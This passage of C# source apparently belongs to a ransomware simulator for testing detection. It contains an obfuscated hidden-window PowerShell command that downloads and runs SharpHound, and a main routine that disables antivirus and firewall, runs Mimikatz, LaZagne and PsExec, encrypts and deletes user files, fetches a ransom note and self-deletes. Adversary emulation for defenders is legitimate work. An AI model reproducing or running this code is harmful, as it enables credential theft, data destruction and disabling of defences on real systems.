            Process.Start("powershell.exe", "-nop -win hid -exec bypass -encodedcommand JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAnAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAJwA7ACAASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAFIASQAgAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AZAA0AHIAawAtAGQANABuAHAAaAAzAC8AUgBhAG4AcwBpAG0ALwByAGEAdwAvAHYAMAAuADIALwBUAG8AbwBsAHMALwBTAGgAYQByAHAASABvAHUAbgBkAC4AZQB4AGUAIAAtAE8AdQB0ACAAJABlAG4AdgA6AHQAZQBtAHAAXABzAGgAYQByAHAAaABvAHUAbgBkAC4AZQB4AGUAOwAgAFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAkAGUAbgB2ADoAdABlAG0AcABcAHMAaABhAHIAcABoAG8AdQBuAGQALgBlAHgAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIAAiAC0ALQBjAG8AbABsAGUAYwB0AGkAbwBuAG0AZQB0AGgAbwBkAHMAIABEAEMAbwBuAGwAeQAgAC0ALQBvAHUAdABwAHUAdABkAGkAcgBlAGMAdABvAHIAeQAgACQAZQBuAHYAOgB0AGUAbQBwACAALQAtAHoAaQBwAGYAaQBsAGUAbgBhAG0AZQAgAEoAUwBPAE4AUgBlAHMAdQBsAHQALgB6AGkAcAAiACAALQBOAG8ATgBlAHcAVwBpAG4AZABvAHcAIAAtAFcAYQBpAHQAOwAgAGQAZQBsACAAJABlAG4AdgA6AHQAZQBtAHAAXABzAGgAYQByAHAAaABvAHUAbgBkAC4AZQB4AGUAIAAtAEYAbwByAGMAZQA7ACAAZABlAGwAIAAkAGUAbgB2ADoAdABlAG0AcABcAEoAUwBPAE4AUgBlAHMAdQBsAHQALgB6AGkAcAA=");
        }

        static void Main(string[] args)
        {
            const string targetDir = "Reports";
            const string ransomNote = "ransom_note.txt";
            const string tempDir = "11";
            const string randomPassword = "12345";
            string userDirPath = Environment.GetEnvironmentVariable("USERPROFILE");
            string targetDirPath = userDirPath + @"\" + targetDir;
            string[] files = Directory.GetFiles(targetDirPath, "*");

            string tempDirPath = userDirPath + @"\" + tempDir;

            // Check if Ransim was ran as Admin
            if (IsAdministrator() == true)
            {
                Console.WriteLine("Please run Ransim as administrator!");
                Console.WriteLine("Exiting...");
                return;
            }

            if (!Directory.Exists(targetDirPath))
            {
                // Precaution
                Console.WriteLine("Reports directory does not exist in USERPROFILE!!");
                Console.WriteLine("Exiting...");
                return;
            }

            //Run Location Check
            LocationCheck();

            RunRecon();
            DisableAV();
            DisableFirewall();
            RunADFind();
            RunPowerView();
            RunSeatbelt();

            RunMimikatz();
            RunLaZagne();

            RunPsExec();

            ExecuteSharpHound();

            SimulateCobaltStrike();

            // Make sure you have correctly configured Rclone before you enable this function
            //ExfilData();

            ManipulateRegistry();
            StopServices();

            Console.WriteLine("Starting encryption process");
            // Iterate over files in the target directory for encryption.
            foreach (string file in files)
            {
                FileEncrypt(file, randomPassword);
                File.Delete(file);
            }

            Console.WriteLine("Downloading ransom note from pastebin.");
            // Download ransom note from Pastebin.
            RansomNoteDownload(ransomNote);

            // Open notepad to display the ransom note.
            Process.Start("notepad.exe", ransomNote);

            Console.WriteLine("Time for you to check your logs.");
            
            // Initiate Self Delete Procedure
            SelfDelete();
        }
    }
}
